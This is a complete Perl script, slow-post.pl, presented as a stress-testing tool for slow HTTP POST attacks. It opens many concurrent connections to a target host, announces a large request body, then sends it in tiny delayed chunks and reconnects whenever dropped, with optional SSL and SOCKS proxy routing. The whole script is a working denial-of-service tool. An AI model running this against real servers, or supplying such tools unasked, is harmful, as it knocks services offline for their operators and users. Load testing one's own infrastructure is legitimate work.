#!/usr/bin/perl

=head1 NAME

slow-post.pl - AnyEvent-based stress-testing tool which uses slow HTTP POST

=head1 DESCRIPTION

This program allows to perform stress tests for slow HTTP POST attacks

=head1 LICENSE

This program is free software; you can redistribute it and/or
modify it under the same terms as Perl itself

=head1 AUTHOR

Vitaly Kramskikh

=cut

use strict;
use warnings;

use Errno;
use POSIX;

use Getopt::Long;

use AnyEvent;
use AnyEvent::Handle;

my $port = 80;
my $concurrency = 25;
my $min_chunk_size = 4;
my $max_chunk_size = 16;
my $min_body_size = $max_chunk_size * 512;
my $max_body_size = $min_body_size * 4;
my $body_send_delay = 2;
my $connection_delay = 1;
my $user_agent = '';
my $ssl = 0;
my $proxy;

my $help;

my $help_message = <<HELP
Usage: $0 [options] hostname

  --ssl                     use HTTPS
  --port=NUM                target port number (default: $port)
  --concurrency=NUM         number of concurrent connections (default: $concurrency)
  --min-chunk-size=BYTES    min post body chunk size in bytes (default: $min_chunk_size)
  --max-chunk-size=BYTES    max post body chunk size in bytes (default: $max_chunk_size)
  --min-body-size=BYTES     min post body size (default: $min_body_size)
  --max-body-size=BYTES     max post body size (default: $max_body_size)
  --body-send-delay=SEC     delay in seconds between completion of sending
                            previous chunk and start of sending next chunk
                            (default: $connection_delay)
  --connection-delay=SEC    delay in seconds before reconnecting (default: $connection_delay)
  --user-agent=STRING       http user agent (default: no User-Agent header)
  --socks-proxy=HOST:PORT   use specified SOCKS proxy

HELP
;

GetOptions(
    'ssl' => \$ssl,
    'port=i' => \$port,
    'concurrency=i' => \$concurrency,
    'min-chunk-size=i' => \$min_chunk_size,
    'max-chunk-size=i' => \$max_chunk_size,
    'min-body-size=i' => \$min_body_size,
    'max-body-size=i' => \$max_body_size,
    'connection-delay=f' => \$connection_delay,
    'body-send-delay=f' => \$body_send_delay,
    'user-agent=s' => \$user_agent,
    'socks-proxy=s' => \$proxy,
    'help' => \$help,
);

if (defined $proxy) {
    if ($proxy =~ /^([\w\.\-]+):(\d+)$/) {
        $proxy = [$1, $2];
    } else {
        print "Please specify proxy in HOST:PORT format\n\n";
        print $help_message;
        exit 1;
    }
}

my $host = $ARGV[0];

if (!defined $host || $help) {
    print $help_message;
    exit 1;
}

my @clients;

foreach my $n (1 .. $concurrency) {
    my $client = new SlowHTTPClient(
        name => "Client #$n",
        host => $host,
        port => $port,
        ssl => $ssl,
        path => '/',
        connection_delay => $connection_delay,
        body_send_delay => $body_send_delay,
        min_chunk_size => $min_chunk_size,
        max_chunk_size => $max_chunk_size,
        min_body_size => $min_body_size,
        max_body_size => $max_body_size,
        user_agent => $user_agent,
        proxy => $proxy,
    );
    
    push @clients, $client;
}

for my $client (@clients) {
    $client->connect;
}

AnyEvent->loop;

package SlowHTTPClient;

sub new {
    my ($class, %params) = @_;
    
    return bless {
        %params,
        fh => undef,
        connected => 0,
    }, $class;
}

sub log {
    my ($self, $message) = @_;
    
    print POSIX::strftime('[%d.%m.%Y %H:%M:%S]', localtime) . " $self->{name}: $message\n";
}

sub connect {
    my $self = shift;
    
    $self->{body_size} = $self->{min_body_size} + int(rand($self->{max_body_size} - $self->{min_body_size} + 1));
    $self->{body} = 'A' x $self->{body_size};
    
    $self->{fh} = new AnyEvent::Handle(
        connect => $self->{proxy} || [$self->{host}, $self->{port}],
        on_error => sub {
            if ($self->{connected}) {
                $self->log("Connection dropped, reconnecting (" .
                           ($self->{body_size} - length $self->{body}) .
                           " of $self->{body_size} bytes sent)");
            } else {
                $self->log("Connection refused, reconnecting");
            }
            
            $self->reconnect($self->{connection_delay} * 5);
        },
        on_eof => sub {
            $self->log("Connection closed, reconnecting (" .
                       ($self->{body_size} - length $self->{body}) .
                       " of $self->{body_size} bytes sent)");
            $self->reconnect;
        },
        on_connect => $self->{proxy} ? sub {$self->_on_proxy_connect} : sub {$self->_on_server_connect},
        keepalive => 1,
    );
}

sub _on_proxy_connect {
    my $self = shift;
    
    $self->{fh}->push_write(pack "CCnNZ*Z*", 4, 1, $self->{port}, 1, '', $self->{host});

    $self->{fh}->push_read(chunk => 8, sub {
        my ($fh, $chunk) = @_;
        my ($status, $port, $ipn) = unpack "xCna4", $chunk;
        
        if ($status == 0x5a) {
            $self->_on_server_connect;
        } else {
            $self->log("Proxy error, status code is 0x" . sprintf('%x', $status));
            $self->reconnect($self->{connection_delay} * 5);
        }
    });
}

sub _on_server_connect {
    my $self = shift;
    
    $self->{connected} = 1;
    $self->log('Connected! Body size is ' . $self->{body_size});
    
    $self->{fh}->on_drain(sub {
        $self->{send_delay_timer} = AnyEvent->timer(
            after => $self->{body_send_delay},
            cb => sub {$self->send_chunk},
        )
    });

    $self->{fh}->starttls('connect') if $self->{ssl};
    
    $self->send_headers;
    $self->send_chunk;
}

sub reconnect {
    my ($self, $delay) = @_;
    
    delete $self->{send_delay_timer};
    $self->{connected} = 0;
    
    $self->{reconnection_timer} = AnyEvent->timer(
        after => $delay || $self->{connection_delay},
        cb => sub {$self->connect},
    );
}

sub send_headers {
    my $self = shift;
    
    my $request = "POST $self->{path} HTTP/1.1\n" .
        "Host: $self->{host}\n" .
        "Content-Type: application/x-www-form-urlencoded\n" .
        (length $self->{user_agent} ? "User-Agent: $self->{user_agent}\n" : '') .
        "Content-Length: " . length($self->{body}) . "\n" .
        "\n";
    
    $self->{fh}->push_write($request);
}

sub send_chunk {
    my $self = shift;
    
    my $chunk_size = $self->{min_chunk_size} + int(rand($self->{max_chunk_size} - $self->{min_chunk_size} + 1));
    my $chunk = substr($self->{body}, 0, $chunk_size, '');
    
    if ($chunk) {
        $self->{fh}->push_write($chunk);
    } else {
        $self->log("Request completed, reconnecting");
        $self->reconnect;
    }
}
